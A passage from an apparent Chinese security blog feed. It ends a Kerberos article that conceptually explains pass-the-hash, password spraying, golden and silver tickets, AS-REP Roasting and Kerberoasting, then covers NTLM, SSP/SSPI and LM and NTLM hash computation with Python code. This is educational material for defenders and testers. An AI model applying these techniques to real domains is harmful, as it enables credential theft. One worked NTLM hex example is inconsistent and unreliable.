src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/1644807401453-351bf8b7-03b7-414d-91ed-80c85d04f202.png" alt="img"></p><p>在AS-REQ请求阶段，是用用户密码Hash或AES Key加密的时间戳。因此当只获得了用户密码Hash时，也可以发起AS-REQ请求，所以也就造成了<strong>PTH哈希传递攻击</strong>；当只获得用户密码的AES Key时，也可以发起AS-REQ请求，所以也就造成了<strong>PTK密钥传递攻击</strong>。</p><p>而 AS-REQ 请求包中 cname 字段的值代表用户名，这个值存在和不存在，返回的包有差异，所以可以用于枚举域内用户名，这种攻击方式被称为 <strong>域内用户枚举攻击</strong> (当未获取到有效域用户权限时，可以使用这个方法枚举域内用户)。并且当用户名存在，密码正确和密码错误时，返回的包也不一样，所以可以进行用户名密码爆破。但是在实战中，渗透测试人员通常都会使用一种被称为 <strong>密码喷洒（Password Spraying）</strong>的攻击方式来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码喷洒通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒是用固定的密码去跑所有的用户名。</p><p>在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码Hash加密的，因此如果我们拥有 krbtgt 的密码 hash 就可以自己制作一个TGT认购权证，这种攻击方式被称为<strong>黄金票据攻击</strong>。同样，在TGS-REP阶段，TGS_REP里面的ST服务票据是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以签发任意用户的ST服务票据，这个票据也被称为白银票据，这种攻击方式被称为<strong>白银票据攻击</strong>。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash。</p><p>在AS-REP阶段，Login session key是用用户密码 Hash 加密的。对于域用户，如果设置了“Do not require Kerberos preauthentication”不需要预认证选项，此时攻击者向域控制器的 88 端口发送 AS_REQ 请求，此时域控不会做任何验证就将 TGT认购权证 和 该用户Hash加密的Login Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Login Session Key进行离线破解，如果破解成功，就能得到该用户的密码明文，这种攻击方式被称为 <strong>AS-REP Roasting攻击</strong>。</p><p>在TGS-REP阶段，由于ST服务票据是用服务Hash加密的。因此，如果我们能获取到ST服务票据，就可以对该ST服务票据进行利息破解，得到服务的Hash，这种攻击方式被称为<strong>Kerberoasting攻击</strong>。这个问题存在的另外一个因素是因为用户向KDC发起TGS_REQ请求，不管用户对服务有没有访问权限，只要TGT认购权证正确，那么KDC都会返回ST服务票据。其实AS_REQ里面的服务就是krbtgt，也就是说这个攻击方式同样可以用于爆破AS_REP里面的TGT认购权证，但是之所以没见到这种攻击方式是因为krbtgt的密码是随机生成的，爆破不出来。</p><p>非常感谢您读到现在，由于作者的水平有限，编写时间仓促，文章中难免会出现一些错误或者描述不准确的地方，恳请各位师傅们批评指正。如果你想一起学习AD域安全攻防的话，可以加入下面的知识星球一起学习交流。</p><p><img src="/2022/03/05/yu-shen-tou-gong-fang/kerberos-xie-yi-xiang-jie/640.png" alt="图片"></p><p>参考：<a href="https://www.rfc-editor.org/rfc/rfc4120.html">https://www.rfc-editor.org/rfc/rfc4120.html</a></p><p><a href="https://www.cnblogs.com/artech/archive/2011/01/24/kerberos.html">https://www.cnblogs.com/artech/archive/2011/01/24/kerberos.html</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)?redirectedfrom=MSDN#signatures-pac_server_checksum-and-pac_privsvr_checksum">https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)?redirectedfrom=MSDN#signatures-pac_server_checksum-and-pac_privsvr_checksum</a></p><p><a href="https://docs.microsoft.com/zh-cn/archive/blogs/apgceps/packerberos-2">https://docs.microsoft.com/zh-cn/archive/blogs/apgceps/packerberos-2</a><br><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#top-level-pac-structure">https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#top-level-pac-structure</a></p><p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)?redirectedfrom=MSDN</a></p><p><a href="https://docs.microsoft.com/zh-cn/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation">https://docs.microsoft.com/zh-cn/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94</a></p><p>相关文章：<a href="https://www.anquanke.com/post/id/171552#h3-5">https://www.anquanke.com/post/id/171552#h3-5</a></p><p><a href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p><p><a href="https://zhuanlan.zhihu.com/p/473625225">https://zhuanlan.zhihu.com/p/473625225</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTLM协议详解</title>
      <link href="2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/"/>
      <url>2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p>本文部分节选于《域渗透攻防指南》，购买请长按如下图片扫码</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/image-20230306213529401.png" alt="image-20230306213529401"></p><p>NTLM(New Technology LAN Manager)身份验证协议是微软用于Windows身份验证的主要协议之一。早期SMB协议以明文口令的形式在网络上传输，因此产生了安全性问题。后来出现了LM(LAN Manager)身份验证协议，它是如此的简单以至于很容易被破解。后来微软提出了NTLM身份验证协议，以及更新的NTLM V2版本。NTLM协议既可以为工作组中的机器提供身份验证，也可以用于域环境身份验证。NTLM协议可以为SMB、HTTP、LDAP、SMTP等上层微软应用提供身份认证。</p><h1 id="SSP和SSPI的概念"><a href="#SSP和SSPI的概念" class="headerlink" title="SSP和SSPI的概念"></a>SSP和SSPI的概念</h1><p>在学习NTLM协议之前，我们先了解两个基本概念：SSPI 和 SSP。</p><h2 id="1-SSPI"><a href="#1-SSPI" class="headerlink" title="1. SSPI"></a>1. SSPI</h2><p><strong>SSPI</strong>(Security Service Provider Interface 或 Security Support Provider Interface，安全服务提供接口) 是 Windows 定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于：</p><ul><li>身份验证机制。</li><li>为其他协议提供的 Session Security 机制。Session Security 指的是会话安全，即为通讯提供数据完整性校验以及数据的加、解密功能。</li></ul><p>SSPI接口定义了与安全有关的功能函数，用来获取验证、信息完整性、信息隐私等安全功能，该接口只是定义了一套接口函数，但是并没有实现具体的内容。</p><h2 id="2-SSP"><a href="#2-SSP" class="headerlink" title="2. SSP"></a>2. SSP</h2><p><strong>SSP</strong>(Security Service Provider，安全服务提供者) 是SSPI 的实现者，微软自己实现了如下的 SSP，用于提供安全功能，包含但不限于：</p><ul><li>NTLM SSP：Windows NT 3.51中引入(msv1_0.dll) ，为Windows 2000之前的客户端-服务器域和非域身份验证（SMB&#x2F;CIFS）提供NTLM质询&#x2F;响应身份验证。</li><li>Kerberos SSP：Windows 2000中引入，Windows Vista中更新为支持AES(kerberos.dll)，Windows 2000及更高版本中首选的客户端-服务器域相互身份验证。</li><li>Digest SSP：Windows XP中引入(wdigest.dll) ，在Windows与Kerberos不可用的非Windows系统间提供基于HTTP和SASL身份验证的质询&#x2F;响应。</li><li>Negotiate SSP：Windows 2000中引入(secur32.dll) ，默认选择Kerberos，如果不可用则选择NTLM协议。Negotiate SSP提供单点登录能力，有时称为集成Windows身份验证（尤其是用于IIS时）。在Windows 7及更高版本中，NEGOExts引入了协商使用客户端和服务器上支持的已安装定制SSP进行身份验证。</li><li>Cred SSP：Windows Vista中引入，Windows XP SP3上也可用(credssp.dll)，为远程桌面连接提供单点登录（SSO）和网络级身份验证。</li><li>Schannel SSP：Windows 2000中引入(Schannel.dll)，Windows Vista中更新为支持更强的AES加密和ECC[6]该提供者使用SSL&#x2F;TLS记录来加密数据有效载荷。</li><li>PKU2U SSP：Windows 7中引入(pku2u.dll) ， 在不隶属域的系统之间提供使用数字证书的对等身份验证。</li></ul><p>因为 SSPI 中定义了与 Session Security 有关的 API。所以上层应用利用任何 SSP 与远程的服务进行了身份验证后，此 SSP 都会为本次连接生成一个随机Key。这个随机Key被称为 Session Key。上层应用在经过身份验证后，可以选择性地使用这个 Key 对之后发往服务端或接收自服务端的数据进行签名或加密。在系统层面，SSP就是一个dll，用来实现身份验证等安全功能。不同的SSP，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种基于质询&#x2F;响应身份验证机制。而 Kerberos SSP 实现的就是基于 Ticket票据的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持我们自定义的身份验证方法。</p><p>SSP、SSPI和各种应用的关系如图1-1所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1635846865165-6af7171f-02a5-4cdd-8714-1c98d39344d4.png" alt="img"></p><p>相关：<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthn/sspi">SSPI</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthn/ssp-packages-provided-by-microsoft">Microsoft 提供的 SSP 包</a></p><h1 id="LM-Hash加密算法"><a href="#LM-Hash加密算法" class="headerlink" title="LM Hash加密算法"></a>LM Hash加密算法</h1><p>LM(LAN Manager)身份认证是微软推出的一个身份认证协议，其使用的加密算法是LM Hash加密算法。LM Hash本质是DES加密，尽管LM Hash较容易被破解，但为了保证系统的兼容性，Windows只是将LM Hash禁用了(从Windwos Vista和Windows Server 2008开始，Windows默认禁用了LM Hash)。LM Hash明文密码被限定在14位以内，也就是说，如果要停止使用LM Hash，将用户的密码设置为14位以上即可。</p><p>如果LM Hash的值为：aad3b435b51404eeaad3b435b51404ee，说明LM Hash为空值或者被禁用了。</p><p>LM Hash的加密流程如下，我们以口令P@ss1234为例演示：</p><p>1）将用户的明文口令转换为大写,并转换为16进制字符串。</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">P@ss1234 <span class="token operator">-></span> 大写 <span class="token operator">=</span> P@SS1234 <span class="token operator">-></span> 转为十六进制 <span class="token operator">=</span> <span class="token number">5040535331323334</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）如果转换后的16进制字符串的长度不足14字节(长度28)，用0来补全。</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token number">5040535331323334</span> <span class="token operator">-></span> 用<span class="token number">0</span> 补全为<span class="token number">14</span>字节<span class="token punctuation">(</span>长度<span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5040535331323334000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）将14字节分为两组，每组7字节转换为二进制数据，每组二进制数据长度为56比特位。如图所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1651224682683-1cb67ac5-4b5d-49fd-a597-bcc8a103a960.png" alt="img"></p><p>4）将每组二进制数据按7比特位为一组，分为8组，每组末尾加0，再转换成16进制，这样每组也就成了8字节长度的16进制数据了。如图所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1651224709202-7007c7df-9a37-494e-b1ad-cd766bd41ee9.png" alt="img"></p><p>5）将上面生成的两组16进制数据，分别作为DES加密密钥对字符串“KGS!@#$%”进行加密。然后将DES加密后的两组密文进行拼接，得到最终的LM HASH值。如图所示。</p><p>KGS!@#$%转为16进制为：4B47532140232425</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1651224808233-09759976-5d14-4d6f-acb0-c9a98a50f358.png" alt="img"><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1651224768619-53b5a67d-87a1-46f1-9852-7c598223b162.png" alt="img"></p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1651224730422-3ba1e71e-453e-4389-9e6c-1b10b5602c6d.png" alt="img"></p><p>LM Hash加密代码实现如下(Python2)：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> base64<span class="token keyword">import</span> binascii<span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> hashlib<span class="token punctuation">,</span>binascii<span class="token keyword">import</span> md5<span class="token keyword">def</span> <span class="token function">DesEncrypt</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> Des_Key<span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>Des_Key<span class="token punctuation">,</span> ECB<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    EncryptStr <span class="token operator">=</span> k<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>EncryptStr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Zero_padding</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">and</span> n <span class="token operator">%</span> <span class="token number">7</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>n<span class="token punctuation">:</span>n <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'0'</span><span class="token punctuation">)</span>            num <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    test_str <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"please input a string: "</span><span class="token punctuation">)</span>    <span class="token comment"># 用户的密码转换为大写</span>    test_str <span class="token operator">=</span> test_str<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"转换为大写:"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>test_str<span class="token punctuation">)</span>    <span class="token comment">#转换为16进制字符串</span>    test_str <span class="token operator">=</span> test_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"转换为16进制字符串:"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>test_str<span class="token punctuation">)</span>    str_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_str<span class="token punctuation">)</span>    <span class="token comment"># 密码不足14字节将会用0来补全</span>    <span class="token keyword">if</span> str_len <span class="token operator">&lt;</span> <span class="token number">28</span><span class="token punctuation">:</span>        test_str <span class="token operator">=</span> test_str<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"不足14字节(长度28)，用0来补全:"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>test_str<span class="token punctuation">)</span>    <span class="token comment"># 固定长度的密码被分成两个7byte部分</span>    t_1 <span class="token operator">=</span> test_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>test_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span>    t_2 <span class="token operator">=</span> test_str<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>test_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"将14字节分为两组，每组7字节"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>    <span class="token comment"># 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span>    t_1 <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>t_1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>    t_2 <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>t_2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"转换为二进制数据，每组二进制数据长度为56比特位"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>    <span class="token comment"># 再分7bit为一组末尾加0，组成新的编码</span>    t_1 <span class="token operator">=</span> Zero_padding<span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>    t_2 <span class="token operator">=</span> Zero_padding<span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"将每组二进制数据按7比特位为一组，分为8组，每组末尾加0"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>    <span class="token comment"># print t_1</span>    t_1 <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>t_1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t_2 <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>t_2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t_1 <span class="token operator">=</span> t_1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span>    t_2 <span class="token operator">=</span> t_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"两组分别转换为16进制字符串"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'0'</span> <span class="token operator">==</span> t_2<span class="token punctuation">:</span>        t_2 <span class="token operator">=</span> <span class="token string">"0000000000000000"</span>    t_1 <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>t_1<span class="token punctuation">)</span>    t_2 <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>t_2<span class="token punctuation">)</span>    <span class="token comment"># 上步骤得到的8byte二组，分别作为DES key为"KGS!@#$%"进行加密。</span>    LM_1 <span class="token operator">=</span> DesEncrypt<span class="token punctuation">(</span><span class="token string">"KGS!@#$%"</span><span class="token punctuation">,</span> t_1<span class="token punctuation">)</span>    LM_2 <span class="token operator">=</span> DesEncrypt<span class="token punctuation">(</span><span class="token string">"KGS!@#$%"</span><span class="token punctuation">,</span> t_2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"上步骤得到的8byte二组，分别作为DES key为\"KGS!@#$%\"进行加密"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"LM_1:"</span><span class="token operator">+</span>LM_1<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"LM_1:"</span><span class="token operator">+</span>LM_2<span class="token punctuation">)</span>    <span class="token comment"># 将二组DES加密后的编码拼接，得到最终LM HASH值。</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[91m'</span><span class="token operator">+</span><span class="token string">"将二组DES加密后的编码拼接，得到最终LM HASH值"</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">)</span>    LM_Hash <span class="token operator">=</span> LM_1 <span class="token operator">+</span> LM_2    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"LM_Hash:"</span><span class="token operator">+</span>LM_Hash<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码运行效果如图所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1667833044418-d11fe9ef-271a-44b7-b93a-d21225709c8d.png" alt="img"></p><h1 id="NTLM-Hash加密算法"><a href="#NTLM-Hash加密算法" class="headerlink" title="NTLM Hash加密算法"></a>NTLM Hash加密算法</h1><p>为了解决LM Hash加密和身份验证方案中固有的安全弱点，微软于1993年在Windows NT 3.1中首次引入了NTLM (<strong>New TechnologyLAN Manager</strong> ) Hash。下图1-3是各个Windows版本对LM Hash和NTLM Hash的支持。也就是说，微软从Windwos Vista和Windows Server 2008开始，默认禁用了LM Hash，只存储NTLM Hash，而LM Hash的位置则为空：aad3b435b51404eeaad3b435b51404ee。</p><p>不同Windows系统版本对LM和NTLM的支持如图1-3所示。</p><p><img src="/2022/03/01/yu-shen-tou-gong-fang/ntlm-xie-yi-xiang-jie/1620905329604-1c98d869-ed99-4301-b0a4-d5238722eee1.png" alt="img"></p><p>NTLM Hash算法是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。</p><p>下面我们来看看NTLM Hash的加密流程。</p><h2 id="1-NTLM-Hash加密流程"><a href="#1-NTLM-Hash加密流程" class="headerlink" title="1. NTLM Hash加密流程"></a>1. NTLM Hash加密流程</h2><p>NTLM Hash的加密方程如下，可以看到NTLM Hash是由明文密码经过三步加密而成：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token class-name">NTLM</span> Hash <span class="token operator">=</span> <span class="token function">md4</span><span class="token punctuation">(</span><span class="token function">unicode</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NTLM Hash的加密流程分为三步，具体如下：</p><p>1）先将用户密码转换为16进制格式。</p><p>2）再将16进制格式的字符串进行ASCII转Unicode编码。</p><p>3）最后对Unicode编码的16进制字符串进行标准MD4单向哈希加密。</p><p>如下可以看到P@ss1234通过NTLM Hash的加密流程一步步加密成为NTLM Hash：74520a4ec2626e3638066146a0d5ceae。</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">P@ss1234 -> 转为十六进制 = 50407373313233345040737331323334 -> ASCII转Unicode编码 = 5000400073007300310032003300340050004000730073003100320033003400 -> MD4加密 = 74520a4ec2626e3638066146a0d5ceae<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>NTLM Hash加密代码实现如下(Python3)：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> MD4<span class="token keyword">import</span> binascii<span class="token keyword">from</span> cprint <span class="token keyword">import</span> cprint<span class="token comment">#转为16进制格式</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> t <span class="token keyword">in</span> string<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#再将16进制格式的字符串进行ASCII转Unicode编码</span><span class="token keyword">def</span> <span class="token function">hex_to_unicode</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> string<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"00"</span><span class="token comment">#最后对Unicode编码的16进制字符串进行标准MD4单向哈希加密</span><span class="token keyword">def</span> <span class="token function">unicode_to_md4</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>  m <span class="token operator">=</span> MD4<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token punctuation">)</span>  m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token 